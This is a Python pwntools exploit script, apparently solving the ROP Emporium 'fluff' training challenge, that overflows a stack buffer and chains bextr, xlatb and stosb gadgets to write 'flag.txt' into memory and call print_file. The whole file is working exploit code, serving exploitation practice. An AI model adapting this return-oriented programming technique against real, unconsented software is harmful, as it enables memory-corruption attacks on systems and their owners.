#!/usr/bin/env python3

from pwn import *
import ctypes

elf = ELF("./fluff")
p = process("./fluff")

writable_area = 0x601028
mov_eax_pop_rbp = p64(0x400610)
pop_rdx_pop_rcx_add_rcx_bextr = p64(0x40062a)
stosb = p64(0x400639)
xlatb = p64(0x400628)
pop_rdi = p64(0x4006a3)
print_file = p64(0x400510)

rop = 40*b'A'

# f
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x6678787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area) + stosb

# l
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x6978787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 1) + stosb

# a
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x6178787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 2) + stosb

# g
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x6778787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 3) + stosb

# .
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x2e78787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 4) + stosb

# t
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x7478787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 5) + stosb

# x
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x7878787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 6) + stosb

# t
rop += mov_eax_pop_rbp + p64(0)
rop += pop_rdx_pop_rcx_add_rcx_bextr + p64(400) + p64(ctypes.c_ulong(0x7478787878787878 - 0x3ef2).value)
rop += xlatb
rop += pop_rdi + p64(writable_area + 7) + stosb

# print file

rop += pop_rdi + p64(writable_area) + print_file

p.recvuntil('> ')
p.sendline(rop)
p.interactive()

